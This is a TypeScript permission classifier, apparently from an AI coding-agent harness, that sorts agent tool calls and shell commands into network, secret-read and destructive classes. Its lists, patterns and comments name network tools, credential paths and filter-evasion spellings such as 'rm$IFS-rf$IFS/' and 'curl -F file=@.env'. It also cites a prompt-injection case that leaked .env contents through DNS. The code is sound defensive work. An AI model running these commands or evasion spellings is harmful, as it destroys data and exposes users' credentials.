/**
 * Tool-to-class classification: the pure function that decides which of the
 * five rule classes a resolved agent action lands in.
 *
 * One home on purpose. The destructive patterns here are the ones
 * `detectDangerousDeletion` carried inside the Claude router, moved out so the
 * rule exists once and the native runtime, the Grok argv builder and any future
 * provider all read the same table. Design:
 * `.dump/app/plans/2026-09-13-permission-floor.md`.
 */
import type { PermissionRuleClass } from "./policy"

/** A named pattern, so a denial can quote what matched. */
interface CommandPattern {
  /** Stable id, used in the rule name: `<class>.<id>`. */
  id: string
  test: (command: string, segments: CommandSegment[]) => boolean
  reason: string
}

interface CommandSegment {
  /** First command word of the segment, basename only, lowercased. */
  verb: string
  /** Every word of the segment, lowercased. */
  words: string[]
  /**
   * True when the segment carries GNU's `--no-target-directory`, which says the
   * last operand is a plain file rather than a directory to write into. Its short
   * spelling `-T` differs from the target-directory flag `-t` by case alone, and
   * lowercasing the words erases that, so the one flag whose case carries meaning
   * is remembered here instead.
   */
  noTargetDirectory: boolean
}

/**
 * Tools that only ever read, so they carry the read-only class.
 *
 * `SlashCommand` is deliberately absent. A custom slash command can carry a `!`
 * shell execution that does not come back through the Bash tool, so treating it
 * as read-only would let plan mode run a command, and a repository can ship its
 * own commands. It takes the residual `approval` class instead, which plan mode
 * refuses. `Skill` stays here because a skill's actions arrive as their own
 * gated tool calls.
 */
const READ_ONLY_TOOLS = new Set([
  "Read",
  "Glob",
  "Grep",
  "LS",
  "NotebookRead",
  "TodoWrite",
  "BashOutput",
  "AskUserQuestion",
  "Skill",
])

/** Tools that reach a network by design, whatever their arguments say. */
const NETWORK_TOOLS = new Set(["WebFetch", "WebSearch"])

/** Tools that write a file, so they carry the approval class. */
const FILE_EDIT_TOOLS = new Set(["Edit", "Write", "MultiEdit", "NotebookEdit"])

/** Tool input keys that name a filesystem path. */
const PATH_INPUT_KEYS = ["file_path", "path", "notebook_path"] as const

/** Every filesystem path this tool input names, in the order the keys appear. */
export function toolPathCandidates(toolInput: Record<string, unknown>): string[] {
  const found: string[] = []
  for (const key of PATH_INPUT_KEYS) {
    const value = toolInput[key]
    if (typeof value === "string" && value.length > 0) found.push(value)
  }
  return found
}

/**
 * Verbs that open an egress channel.
 *
 * The cloud and cluster CLIs are here wholesale because every subcommand they
 * have talks to an API, and DNS tools are here because DNS is a documented
 * exfiltration route that gets past egress filtering: CVE-2025-55284 hid a
 * prompt in a file Claude Code analysed and left with the `.env` contents in
 * DNS queries rather than an HTTP request.
 */
const NETWORK_VERBS = new Set([
  "curl",
  "wget",
  "nc",
  "ncat",
  "netcat",
  "telnet",
  "ssh",
  "scp",
  "sftp",
  "ftp",
  "lftp",
  "socat",
  "rclone",
  "mosh",
  "aws",
  "gcloud",
  "az",
  "kubectl",
  "dig",
  "nslookup",
  "host",
  "ping",
  "ping6",
  "traceroute",
  "tracepath",
  "mtr",
])

/**
 * Verbs that only open a channel for some subcommands, so the subcommand is
 * read before the segment counts as network. `docker ps` and `gh --version` are
 * local; `docker push` and `gh release upload` are not.
 *
 * A container that starts gets the default bridge network, and an image the host
 * does not have is pulled before it starts, so `run`, `create` and `start` open a
 * channel, and `exec` runs code in a container that already has one. `build`
 * joins them, because a `RUN` step runs on the default build network whether or
 * not the base image is cached, so a cached base changes nothing about the
 * channel.
 */
const NETWORK_SUBCOMMAND_VERBS: Record<string, Set<string>> = {
  docker: new Set(["push", "pull", "login", "run", "create", "start", "exec", "build"]),
  podman: new Set(["push", "pull", "login", "run", "create", "start", "exec", "build"]),
  gh: new Set(["api", "release", "gist"]),
  openssl: new Set(["s_client", "s_server"]),
}

/** Git subcommands that talk to a remote. */
const NETWORK_GIT_SUBCOMMANDS = new Set(["push", "fetch", "clone", "pull", "remote", "ls-remote"])

/** Package-manager subcommands that publish rather than install. */
const NETWORK_PUBLISH_SUBCOMMANDS: Record<string, Set<string>> = {
  npm: new Set(["publish"]),
  yarn: new Set(["publish"]),
  pnpm: new Set(["publish"]),
  cargo: new Set(["publish"]),
  twine: new Set(["upload"]),
}

/**
 * Paths whose contents leave the machine the moment a model reads them, because
 * the model's context is uploaded to the provider by design. No later gate can
 * catch that, so the read itself is the exfiltration boundary.
 *
 * Deliberately narrow. `credentials` and `*.key` as bare substrings would match
 * ordinary source files, so each entry names a real secret location.
 */
const SECRET_PATH_PATTERNS: Array<{ id: string; test: (path: string) => boolean }> = [
  { id: "ssh-directory", test: (p) => p.includes(".ssh/") },
  {
    id: "aws-credentials",
    test: (p) => p.includes(".aws/credentials") || p.includes(".aws/config"),
  },
  { id: "github-cli-hosts", test: (p) => p.includes(".config/gh/hosts.yml") },
  { id: "netrc", test: (p) => /(^|\/)[._]netrc$/.test(p) },
  { id: "git-credentials", test: (p) => p.includes(".git-credentials") },
  { id: "provider-credentials", test: (p) => p.includes(".credentials.json") },
  { id: "private-key", test: (p) => /(^|\/)id_(rsa|dsa|ecdsa|ed25519)$/.test(p) },
  { id: "certificate", test: (p) => /\.(pem|p12|pfx|key)$/.test(p) },
  { id: "dotenv", test: (p) => isDotenvPath(p) },
]

/** Suffixes that mark a dotenv file as a template rather than a live secret. */
const DOTENV_SAFE_SUFFIXES = new Set(["example", "sample", "template", "dist", "md", "txt"])

function isDotenvPath(candidate: string): boolean {
  const segments = candidate.split(/[\\/]/)
  const name = segments.at(-1) ?? ""
  if (name === ".env") return true
  if (!name.startsWith(".env.")) return false
  return !DOTENV_SAFE_SUFFIXES.has(name.slice(".env.".length).toLowerCase())
}

/**
 * The secret location this tool input names, when it names one.
 *
 * The path is matched with its separators normalised and its case dropped, and
 * reported as the caller wrote it. Every pattern here reads a forward slash
 * and a lowercase name, and a provider on Windows hands over
 * `C:\Users\me\.SSH\id_rsa` on a case-insensitive filesystem. Command words
 * reach this file through `unquote` with the same normalisation and lowercasing
 * already done, but a tool input path does not get either, so the same secret
 * was exfiltration on POSIX and an ordinary read on Windows, where every mode
 * allows it.
 */
export function findSecretPath(
  toolInput: Record<string, unknown>,
): { id: string; path: string } | null {
  for (const candidate of toolPathCandidates(toolInput)) {
    // The match lowercases the path as well as normalising the separators: a
    // provider on Windows hands over `C:\Users\me\.SSH\id_rsa` and the
    // filesystem there is case-insensitive, and the command path reaches the
    // same patterns with every word lowercased already. The reported path stays
    // as the caller wrote it.
    const normalized = candidate.replaceAll("\\", "/").toLowerCase()
    for (const pattern of SECRET_PATH_PATTERNS) {
      if (pattern.test(normalized)) return { id: pattern.id, path: candidate }
    }
  }
  return null
}

/**
 * True when some segment names a secret location without writing to it.
 *
 * A segment that redirects is writing, and a write to `~/.ssh/authorized_keys`
 * is a protected-path overwrite rather than a leak, so it stays with the
 * destructive pattern that already names it and keeps its own accurate reason.
 * Everything else that names a secret is treated as a read, because the gate
 * cannot tell `cat` from `chmod` reliably and the cost of guessing wrong in the
 * other direction is a private key in a provider's context.
 */
function commandReadsSecret(segments: CommandSegment[]): boolean {
  return segments.some((segment) =>
    segment.words.some((word, index) => readsSecretHere(segment, word, index)),
  )
}

/**
 * True when this word names a secret and the segment is reading it rather than
 * writing to it.
 *
 * A word glued to a redirect operator is a write when the secret sits after the
 * operator, which is what `echo key>/home/u/.ssh/authorized_keys` does. The same
 * word with the secret before the operator is a read, because
 * `echo ~/.ssh/id_rsa>/tmp/x` prints the key and sends it somewhere ordinary.
 */
function readsSecretHere(segment: CommandSegment, word: string, index: number): boolean {
  if (!namesSecret(word)) return false
  const operator = word.lastIndexOf(">")
  if (operator >= 0) return !namesSecret(word.slice(operator + 1))
  return !isWriteTarget(segment, index)
}

/**
 * True when the word at this index is being written to rather than read.
 *
 * Only the redirect target counts. An earlier version of this check asked
 * whether the segment contained a redirect anywhere, which made
 * `cat ~/.ssh/id_ed25519 2>/dev/null` look like a write and let the key through,
 * because a stderr redirect says nothing about where standard output goes. The
 * question that matters is whether this word sits on the receiving end of one.
 */
function isWriteTarget(segment: CommandSegment, index: number): boolean {
  // A write verb's destination is a write, so `cp /tmp/k ~/.ssh/authorized_keys`
  // is a protected-path overwrite rather than a read of a secret location. A
  // target-directory flag moves the destination off the last word and turns every
  // other operand into a source, so `cp -t /tmp/x ~/.ssh/id_rsa` reads the key
  // exactly as `cp ~/.ssh/id_rsa /tmp/x` does.
  if (WRITES_EVERY_ARGUMENT.has(segment.verb)) return true
  if (WRITES_LAST_ARGUMENT.has(segment.verb)) return index === writeTargetIndex(segment)
  const word = segment.words[index] ?? ""
  if (word.startsWith(">")) return true
  const previous = segment.words[index - 1] ?? ""
  return previous.endsWith(">")
}

/**
 * True when a word names a secret location, including through the punctuation
 * that attaches it to something else. `curl -F file=@.env` uploads a dotenv with
 * no space between the flag, the assignment and the path, and matching the whole
 * word only would have called that an ordinary network call.
 */
function namesSecret(word: string): boolean {
  const candidates = [word, word.replace(/^@/, "")]
  const separator = word.indexOf("=")
  if (separator >= 0) {
    const value = word.slice(separator + 1)
    candidates.push(value, value.replace(/^@/, ""))
  }
  return candidates.some((candidate) =>
    SECRET_PATH_PATTERNS.some(
      (pattern) => pattern.test(candidate) || pattern.test(resolveDotSegments(candidate)),
    ),
  )
}

/**
 * Verbs that run the command after them instead of doing work of their own.
 *
 * Stripped before the real verb is read, because a wrapper otherwise hides a
 * command from every pattern in this file. `timeout 30 rm -rf /` read as the
 * verb `timeout`, which is not a delete, so the command landed in `approval` and
 * Agent mode allowed it. Claude Code strips the same idea before matching a Bash
 * rule, which its documentation lists as timeout, time, nice, nohup, stdbuf and
 * bare xargs, "so they cannot be used to smuggle a command past a rule".
 *
 * The shell verbs are here too, with their `-c` payload. Quotes are stripped
 * from every word first, so `bash -c "rm -rf /"` reads as the words
 * `bash -c rm -rf /` and the verb resolves to `rm`.
 */
const WRAPPER_VERBS = new Set([
  "sudo",
  "doas",
  "su",
  "runuser",
  "pkexec",
  "env",
  "command",
  "builtin",
  "exec",
  "nohup",
  "nice",
  "ionice",
  "time",
  "timeout",
  "stdbuf",
  "xargs",
  "setsid",
  "chroot",
  "unshare",
  "nsenter",
  "systemd-run",
  "machinectl",
  "script",
  "watch",
  "parallel",
  "sh",
  "bash",
  "zsh",
  "dash",
  "ksh",
  "eval",
])

/**
 * Wrapper options that take a separate value, so the value is skipped with them.
 * Without this, `sudo -u root rm -rf /` resolved its verb to `-u` and then to
 * `root`, and `nice -n 5 rm -rf /` resolved to `5`.
 *
 * `-c` is deliberately absent. It takes a value for some wrappers but for the
 * shell verbs it introduces the payload this file needs to read, so skipping the
 * next word would skip the real verb.
 */
const WRAPPER_VALUE_FLAGS = new Set([
  "-u",
  "-n",
  "-g",
  "-t",
  "--user",
  "--group",
  "--priority",
  "--cores",
])

/**
 * Wrappers whose first argument is a subject rather than a command, so the
 * subject is skipped with the wrapper. `su root -c "rm -rf /"` read its verb as
 * `root` without this, which is not a delete and not a wrapper, so the command
 * landed in `approval`. `su -c "rm -rf /"` needs no skip, because its first
 * argument is already a flag.
 */
const WRAPPER_SUBJECT_VERBS = new Set(["su", "runuser"])

/** A bare duration, which is what `timeout` and `time` take as their argument. */
const DURATION_WORD = /^\d+(?:\.\d+)?[smhd]?$/

/**
 * Normalise one word so a hidden verb cannot ride through it.
 *
 * Quotes are dropped, which is what turns `of="/dev/sda"` into `of=/dev/sda` and
 * `c"h"m"o"d` into `chmod`. Backslashes become forward slashes for two reasons:
 * `\rm -rf /` is the classic spelling that steps around a shell alias and it
 * resolves to the verb `rm` once the basename is taken, and a Windows path gains
 * the separators the secret patterns match on, so `C:\Users\me\.ssh\id_rsa`
 * reaches the `.ssh/` rule instead of sliding past it.
 */
function unquote(word: string): string {
  return word.replaceAll("\\", "/").replaceAll(/["'`]/g, "")
}

/**
 * The verb of one segment: the first word that is not an environment
 * assignment, not a wrapper, and not a flag or a wrapper's value.
 */
function readVerb(words: string[]): string {
  for (let index = 0; index < words.length; index += 1) {
    const word = words[index]
    if (word === undefined) break
    const verb = verbCandidate(word)
    if (verb !== null) return verb
    index += wordsConsumed(word, words[index + 1])
  }
  return ""
}

/**
 * The verb this word carries, or null when the word is one the finder steps
 * over: an environment assignment, a flag, a bare duration, or a wrapper.
 */
/**
 * A command word made of plain characters and one-member bracket classes
 * resolves to exactly one word, and the shell expands it to that word before
 * it runs. `r[m]` is the documented spelling that slips past a matcher keyed
 * on `rm`, so the resolved word is what gets classified. A range, a negation
 * or a multi-member class can resolve to many words, and that is the
 * deobfuscation residual this classifier does not chase: such a word
 * classifies as itself.
 */
const PLAIN_WORD_CHAR = /[A-Za-z0-9_]/

function resolveBracketedWord(base: string): string {
  if (!base.includes("[")) return base
  let out = ""
  let index = 0
  while (index < base.length) {
    const char = base[index]
    if (char === "[") {
      const close = base.indexOf("]", index + 2)
      const member = base[index + 1]
      if (close !== index + 2 || member === undefined || member === "!") return base
      out += member
      index = close + 1
      continue
    }
    if (char === undefined || !PLAIN_WORD_CHAR.test(char)) return base
    out += char
    index += 1
  }
  return out
}

/**
 * The verb this word carries, or null when the word is one the finder steps
 * over: an environment assignment, a flag, a bare duration, or a wrapper.
 */
function verbCandidate(word: string): string | null {
  if (word.includes("=")) return null
  if (word.startsWith("-")) return null
  const base = word.split("/").pop() ?? word
  if (DURATION_WORD.test(base)) return null
  const verb = resolveBracketedWord(base)
  return WRAPPER_VERBS.has(verb) ? null : verb
}

/**
 * How many words this one takes with it, so the finder can step over both.
 * A value flag carries its value, and a wrapper that takes a subject carries the
 * user or unit it acts on.
 */
function wordsConsumed(word: string, next: string | undefined): number {
  if (word.startsWith("-")) return WRAPPER_VALUE_FLAGS.has(word) ? 1 : 0
  const base = word.split("/").pop() ?? word
  if (!WRAPPER_SUBJECT_VERBS.has(base)) return 0
  return next !== undefined && !next.startsWith("-") ? 1 : 0
}

/**
 * Split a shell command into segments on the operators that start a new
 * command. `$IFS` becomes a space first, because it is the shell's own field
 * separator and `rm$IFS-rf$IFS/` is a documented way to write `rm -rf /` without
 * a literal space for a matcher to split on.
 *
 * This is not a shell parser and does not claim to be one, and it is not a
 * security boundary on its own: an interpreter that takes inline code,
 * `python -c` or `node -e`, still hides whatever it runs, and so do glob and
 * parameter spellings such as `/usr/bin/p?ng` and `who$@ami`. A bracket that
 * names one character, `n[c]`, resolves to the single word it is, and that is
 * the only glob the splitter claims to read. The wider gap is recorded in
 * `.dump/app/decisions/2026-09-13-permission-floor.md` rather than papered
 * over here, because the research on agent shell filters is unanimous that a
 * pattern list cannot win against a shell grammar and only an OS sandbox can.
 */
export function splitCommandSegments(command: string): CommandSegment[] {
  return (
    command
      .replaceAll(/\$\{?ifs\}?/gi, " ")
      // `find . \( -name x \) -delete` groups its predicates with escaped
      // parentheses, which are arguments rather than a subshell. Splitting on them
      // put `-delete` in a segment of its own, away from the `find` that carries
      // it, and the delete read as an ordinary command. An exec predicate ends
      // the same way, `find . -exec echo {} \; -exec rm {} +`, and a split on the
      // escaped terminator put the second predicate in a segment of its own,
      // away from the `find` that carries it.
      .replaceAll(/\\\(|\\\)|\\;|\\&/g, " ")
      .split(/&&|\|\||[|;\n`()]|\$\(/)
      .map((raw) => raw.trim())
      .filter((text) => text.length > 0)
      .map((text) => {
        const split = text
          .split(/\s+/)
          .filter((word) => word.length > 0)
          .map((word) => unquote(word))
          .filter((word) => word.length > 0)
        const words = split.map((word) => word.toLowerCase())
        return {
          verb: readVerb(words),
          words,
          noTargetDirectory: split.some(isNoTargetDirectoryFlag),
        }
      })
  )
}

function hasRecursiveForceRm(segments: CommandSegment[]): boolean {
  return segments.some((segment) => {
    if (segment.verb !== "rm") return false
    const shortFlags = segment.words
      .filter((word) => /^-[a-z]+$/.test(word))
      .map((word) => word.slice(1))
      .join("")
    const recursive = shortFlags.includes("r") || segment.words.includes("--recursive")
    const force = shortFlags.includes("f") || segment.words.includes("--force")
    return recursive && force
  })
}

/**
 * Locations a write needs a card for.
 *
 * `/dev` is absent because `redirectsOntoBlockDevice` and `writesBlockDevice` read
 * the block-device pattern instead, which is precise where a prefix match is not.
 * A `/dev/` prefix called `dd of=/dev/null` a disk reformat.
 */
const PROTECTED_WRITE_PREFIXES = ["/etc/", "/usr/", "/bin/", "/sbin/", "/boot/"]

/**
 * True for the ssh directory in any spelling.
 *
 * A provider hands over an absolute path, so matching `~/.ssh/` alone left
 * `tee /home/u/.ssh/authorized_keys` and `echo key > /home/u/.ssh/authorized_keys`
 * matching nothing at all. Both install a login key, and both landed in the
 * approval class, which Agent mode allows without a card.
 */
function isSshDirectory(word: string): boolean {
  return word.startsWith(".ssh/") || word.includes("/.ssh/")
}

// `SECRET_PATH_PATTERNS` matches `.ssh/` as a bare substring, with no boundary
// before the dot, so `backup.ssh/keys` reads as a secret there and as an ordinary
// path here. That difference is deliberate and the two are not drift. The cost of
// a false positive on a read is a card, and the cost of a false negative is a key
// in a provider's context, so the read matcher stays the broader of the two. The
// cost here runs the other way, because a false positive calls an ordinary
// directory a protected system path.

/**
 * The absolute path a string of `dir/..` pairs resolves to, without touching the
 * filesystem.
 *
 * Only absolute paths are resolved, because a relative path climbs from a working
 * directory this gate cannot see, and a bare `..` stays what it is, which is the
 * critical target `criticalTargetKind` names. This is what lets
 * `tee /tmp/../etc/passwd` read as the write to `/etc/passwd` it is.
 */
function resolveDotSegments(path: string): string {
  if (!path.startsWith("/")) return path
  const stack: string[] = []
  for (const part of path.split("/")) {
    if (part === "" || part === ".") continue
    if (part === "..") {
      stack.pop()
      continue
    }
    stack.push(part)
  }
  return `/${stack.join("/")}`
}

function isProtectedLocation(word: string): boolean {
  // A protected path reached through a `dir/..` pair is the same write, so the
  // check resolves the path before it reads the prefix.
  const path = resolveDotSegments(word)
  return (
    isSshDirectory(word) ||
    isSshDirectory(path) ||
    PROTECTED_WRITE_PREFIXES.some((prefix) => path.startsWith(prefix))
  )
}

/**
 * True when a segment redirects into a protected location.
 *
 * This reads the same `isProtectedLocation` that `writesProtectedPath` reads,
 * because the two used to spell the ssh directory differently and an absolute home
 * path matched neither of them.
 *
 * `/dev/tcp` and `/dev/udp` are neither protected nor a device. They are bash's
 * pseudo-device sockets, so `exec 196<>/dev/tcp/host/port` is a network
 * connection, and the network rule names what it actually is. Denying that as a
 * write into a protected directory refuses the right command for the wrong reason.
 */
function hasProtectedRedirect(segments: CommandSegment[]): boolean {
  return segments.some((segment) => redirectTargets(segment).some(isProtectedLocation))
}

/**
 * True when a segment redirects onto a block device. Kept apart from the
 * protected-path rule because that rule's reason names a system directory and
 * `/dev/sda` is not one, so a denial for `echo x > /dev/sda` would have described
 * the wrong thing.
 */
function redirectsOntoBlockDevice(segment: CommandSegment): boolean {
  return redirectTargets(segment).some(isBlockDevice)
}

/**
 * Every redirect target in one segment. The target is the tail of the word
 * holding the operator, or the word after it, so `>/etc/passwd` and
 * `> /etc/passwd` both count and a check that read only one of the two spellings
 * would miss the other.
 */
function redirectTargets(segment: CommandSegment): string[] {
  const targets: string[] = []
  segment.words.forEach((word, index) => {
    const operator = word.lastIndexOf(">")
    if (operator < 0) return
    const glued = word.slice(operator + 1)
    if (glued.length > 0) targets.push(glued)
    const next = segment.words[index + 1]
    if (next !== undefined) targets.push(next)
  })
  return targets
}

/**
 * True when a write verb targets a protected location with no redirect operator
 * to match. `tee ~/.ssh/authorized_keys` installs a key and would otherwise land
 * in the approval class.
 */
function writesProtectedPath(segments: CommandSegment[]): boolean {
  return segments.some((segment) => writesWhereVerbAims(segment, isProtectedLocation))
}

/**
 * True when this segment aims a write verb at a word `dangerous` accepts.
 *
 * Which argument counts is the verb's business, and the protected-path check, the
 * block-device check and `isWriteTarget` all need the same answer, so it lives
 * here once. A verb that writes every argument can hit the target anywhere, while
 * a verb with a distinct destination writes where `writeDestinations` says.
 */
function writesWhereVerbAims(
  segment: CommandSegment,
  dangerous: (word: string) => boolean,
): boolean {
  if (WRITES_EVERY_ARGUMENT.has(segment.verb)) return segment.words.some(dangerous)
  return writeDestinations(segment).some(dangerous)
}

/** The two spellings of GNU's `--no-target-directory`, in the case they were written. */
function isNoTargetDirectoryFlag(word: string): boolean {
  return word === "-T" || word === "--no-target-directory"
}

/** GNU's spellings of "the destination is this directory". */
const TARGET_DIRECTORY_FLAGS = new Set(["-t", "--target-directory"])
const TARGET_DIRECTORY_PREFIX = "--target-directory="

/** A target-directory flag's value, and the word it was read from. */
type TargetDirectory = { directory: string; index: number }

/**
 * The directory a target-directory flag names in this segment, or null when it
 * carries none.
 *
 * `-t DIR`, `--target-directory DIR` and `--target-directory=DIR` are the
 * spellings, and GNU also reads a value glued to a short cluster as that flag's
 * argument, so `-tDIR` names a directory as well.
 */
function readTargetDirectory(segment: CommandSegment): TargetDirectory | null {
  // `-T` says the last operand is the destination file itself, and GNU refuses it
  // beside `-t`, so a segment carrying one has no target directory to read. Without
  // this the lowercased `-T` reads as `-t` and names the source as the destination.
  if (segment.noTargetDirectory) return null
  for (let index = 0; index < segment.words.length; index += 1) {
    const word = segment.words[index] ?? ""
    if (TARGET_DIRECTORY_FLAGS.has(word)) {
      const next = segment.words[index + 1]
      if (next === undefined) continue
      return { directory: next, index: index + 1 }
    }
    if (word.startsWith(TARGET_DIRECTORY_PREFIX)) {
      return { directory: word.slice(TARGET_DIRECTORY_PREFIX.length), index }
    }
    if (word.startsWith("-t") && !word.startsWith("--") && word.length > 2) {
      return { directory: word.slice(2), index }
    }
  }
  return null
}

/**
 * Every path a write verb with a distinct destination writes to.
 *
 * Without a target-directory flag that is the last word alone, because
 * `cp /etc/passwd /tmp/copy` reads a protected file and writes an ordinary one.
 * With the flag the directory is the destination and every other operand is a
 * source, so `cp -t /home/u/.ssh /tmp/authorized_keys` writes inside a protected
 * directory and reads an ordinary file, which is the reverse of what reading the
 * last word says. Each source also lands in that directory under its own
 * basename, so `cp -t /etc /tmp/passwd` is checked as a write to `/etc/passwd`.
 */
function writeDestinations(segment: CommandSegment): string[] {
  if (!WRITES_LAST_ARGUMENT.has(segment.verb)) return []
  const target = readTargetDirectory(segment)
  if (target === null) return [segment.words.at(-1) ?? ""]
  const found = [target.directory]
  segment.words.forEach((word, index) => {
    if (index === target.index || word === segment.verb || word === "sudo") return
    if (word.startsWith("-")) return
    const joined = joinUnderDirectory(target.directory, word)
    if (joined !== null) found.push(joined)
  })
  return found
}

/** `directory` with the basename of `source` under it, or null when either names no file. */
function joinUnderDirectory(directory: string, source: string): string | null {
  if (directory.length === 0 || source.length === 0) return null
  const slash = source.lastIndexOf("/")
  const base = slash === -1 ? source : source.slice(slash + 1)
  if (base.length === 0) return null
  let end = directory.length
  while (end > 0 && directory[end - 1] === "/") end--
  return `${directory.slice(0, end)}/${base}`
}

/** The word this segment's destination is read from, which a flag can move. */
function writeTargetIndex(segment: CommandSegment): number {
  const target = readTargetDirectory(segment)
  return target === null ? segment.words.length - 1 : target.index
}

function hasDestructiveSql(command: string): boolean {
  return /\b(DROP|TRUNCATE)\s+(TABLE|DATABASE|SCHEMA)\b/i.test(command)
}

/**
 * A `git push` that rewrites remote history. Read from the segment rather than
 * by regex over the whole command, because the regex needed `git` and `push` to
 * be adjacent and so missed `git -C /repo push --force`.
 */
function hasForcedGitPush(segments: CommandSegment[]): boolean {
  return segments.some((segment) => {
    if (segment.verb !== "git" || readSubcommand(segment) !== "push") return false
    return segment.words.some(isForceSpelling)
  })
}

/**
 * True for any way of spelling a forced push: the long flags, a short-flag
 * cluster containing `f` such as `-f` or `-fu`, and the `+refspec` form, which
 * forces the update without naming a flag at all.
 */
function isForceSpelling(word: string): boolean {
  if (word.startsWith("--force")) return true
  if (word.startsWith("+") && word.length > 1) return true
  return isShortFlagClusterCarrying(word, "f")
}

/**
 * True for a short flag cluster such as `-f` or `-fu` that carries this letter.
 *
 * Spelled as a shape test plus a search rather than as one regex, because
 * `/^-[a-z]*f[a-z]*$/` makes the letter run ambiguous and backtracks over it,
 * which is super-linear in the length of the word.
 */
function isShortFlagClusterCarrying(word: string, letter: string): boolean {
  if (!word.startsWith("-") || word.startsWith("--")) return false
  const cluster = word.slice(1)
  return cluster.length > 0 && /^[a-z]+$/.test(cluster) && cluster.includes(letter)
}

/**
 * A git command that throws work away. Read from the segment rather than by
 * regex over the whole command, for the reason `hasForcedGitPush` gives: git's
 * own global options sit between `git` and the subcommand, so
 * `git -C /repo reset --hard` and `git --no-pager clean -fdx` both defeat a
 * pattern that expects the two words to be adjacent. Fixing that for `push` and
 * leaving it here would have been half a fix.
 */
function hasDiscardingGitCommand(segments: CommandSegment[]): boolean {
  return segments.some((segment) => {
    if (segment.verb !== "git") return false
    const subcommand = readSubcommand(segment)
    if (subcommand === "reset") return segment.words.includes("--hard")
    if (subcommand === "clean") return segment.words.some(isForceSpelling)
    if (subcommand === "stash") {
      return segment.words.includes("clear") || segment.words.includes("drop")
    }
    if (subcommand === "reflog") return segment.words.includes("expire")
    if (subcommand === "update-ref" || subcommand === "tag") {
      return segment.words.some((word) => word === "-d" || word === "--delete")
    }
    // `filter-branch` and `filter-repo` rewrite every commit in the repository,
    // which is unrecoverable once the originals are garbage collected.
    return subcommand === "filter-branch" || subcommand === "filter-repo"
  })
}

/**
 * A forced branch delete. Checked against the raw command because the segment
 * words arrive lowercased, and lowercasing is what makes `git branch -D`, which
 * discards an unmerged branch, indistinguishable from `git branch -d`, which
 * refuses to. The character class stands in for the segment boundary so git's
 * global options between `git` and `branch` do not defeat the match, which is
 * the same adjacency problem the segment-based checks above exist to avoid.
 */
const FORCED_BRANCH_DELETE = /\bgit\b[^|;&\n]*\bbranch\b[^|;&\n]*(?:-[a-z]*D|--delete)/

function hasForcedBranchDelete(command: string): boolean {
  return FORCED_BRANCH_DELETE.test(command)
}

/** Partition and filesystem tools, which destroy data whatever their args. */
const DISK_VERBS = new Set([
  "wipefs",
  "fdisk",
  "cfdisk",
  "sfdisk",
  "parted",
  "sgdisk",
  "gdisk",
  "mkswap",
  "partprobe",
])

/**
 * Tools that destroy a device only for some subcommands, so the subcommand or
 * the flag is read before the segment counts. `nvme list` and `mdadm --detail`
 * are reads, while `nvme format` and `mdadm --zero-superblock` are not, and
 * treating the verb alone as destructive would ask for a card on every query.
 */
const DISK_SUBCOMMAND_VERBS: Record<string, Set<string>> = {
  nvme: new Set(["format", "sanitize"]),
  dmsetup: new Set(["remove", "remove_all", "wipe_table", "suspend"]),
}

/**
 * A word whose presence makes the verb destructive rather than a query.
 *
 * Predicates rather than patterns, because one of these needed a short-flag
 * cluster test and `/^-[a-z]*d[a-z]*$/` backtracks over the letter run, which is
 * super-linear in the length of the word. `isShortFlagClusterCarrying` answers the
 * same question without the ambiguity, and a record that mixed the two shapes
 * would have been harder to read than one that does not.
 */
const DISK_DESTRUCTIVE_FLAGS: Record<string, (word: string) => boolean> = {
  hdparm: (word) => /^--(security-erase|security-erase-null|make-bad|fwdownload)/.test(word),
  mdadm: (word) => /^--(zero-superblock|remove|stop|zero)/.test(word),
  badblocks: (word) => /^-[a-z]*w/.test(word),
  smartctl: (word) => /^--(security-erase|sanitize)/.test(word),
  // `losetup` detaches with a flag rather than a subcommand, and `readSubcommand`
  // steps over every word that starts with a dash, so listing `-d` and
  // `--detach-all` as subcommands made them unreachable and a loop device detach
  // classified as approval. `-D` is the same word once a segment is lowercased.
  losetup: (word) => word.startsWith("--detach") || isShortFlagClusterCarrying(word, "d"),
}

/**
 * Verbs whose every argument is a destination, so any of them can be the target.
 *
 * `cat` is not here. It reads its arguments, and `cat /dev/sda > backup.img` is a
 * read of a disk rather than a write to one, so counting it produced a false
 * positive on a command that destroys nothing. A write through `cat` needs a
 * redirect, and `hasProtectedRedirect` already reads that.
 */
const WRITES_EVERY_ARGUMENT = new Set(["tee", "truncate", "shred"])

/**
 * Verbs whose destination is their last argument. `cp /dev/sda /tmp/backup` reads
 * the device and writes an ordinary file, so only the last word can be the target
 * that matters.
 *
 * `ln` belongs here because the link it names last is a file it writes, and a link
 * is a way to put attacker-chosen content in a protected directory with no copy
 * verb on the line. The GNU coreutils manual groups these four, `cp`, `install`,
 * `ln` and `mv`, as the commands that take `--target-directory`, so the flag
 * parser below serves all of them.
 */
const WRITES_LAST_ARGUMENT = new Set(["cp", "mv", "install", "ln"])

/**
 * A block device rather than any `/dev` entry. `/dev/null`, `/dev/zero`,
 * `/dev/stdout` and `/dev/shm` are not storage and writing to them destroys
 * nothing, so matching `/dev/` as a prefix called `dd if=x of=/dev/null` a disk
 * reformat. The pseudo-device sockets `/dev/tcp` and `/dev/udp` are excluded for
 * the same reason, and they are a network rule instead.
 */
const BLOCK_DEVICE =
  /^\/dev\/(sd[a-z]|hd[a-z]|vd[a-z]|xvd[a-z]|nvme\d|md\d|loop\d|mmcblk\d|sr\d|zd\d|dasd|mapper\/|disk\/|block\/)/

/** Power-state verbs, whether invoked directly or through a service manager. */
const POWER_VERBS = new Set(["shutdown", "reboot", "halt", "poweroff"])

function hasDiskOrPowerVerb(segments: CommandSegment[]): boolean {
  return segments.some((segment) => {
    if (redirectsOntoBlockDevice(segment)) return true
    if (segment.verb.startsWith("mkfs")) return true
    if (DISK_VERBS.has(segment.verb)) return true
    if (writesBlockDevice(segment)) return true
    if (DISK_SUBCOMMAND_VERBS[segment.verb]?.has(readSubcommand(segment))) return true
    const destructiveFlag = DISK_DESTRUCTIVE_FLAGS[segment.verb]
    if (destructiveFlag && segment.words.some(destructiveFlag)) return true
    if (segment.verb === "chmod" && segment.words.includes("777")) {
      return segment.words.some((word) => word === "/" || word.startsWith("/*"))
    }
    // `systemctl poweroff` and `service host reboot` reach the same place the
    // bare verbs do, so the subcommand is read for them too.
    if (segment.verb === "systemctl" || segment.verb === "service") {
      return segment.words.some((word) => POWER_VERBS.has(word))
    }
    return POWER_VERBS.has(segment.verb)
  })
}

/**
 * True when the segment writes to a block device. `dd` names its output with
 * `of=`, which is why the check reads that word rather than the whole segment,
 * and every other write verb takes the device as a positional argument.
 */
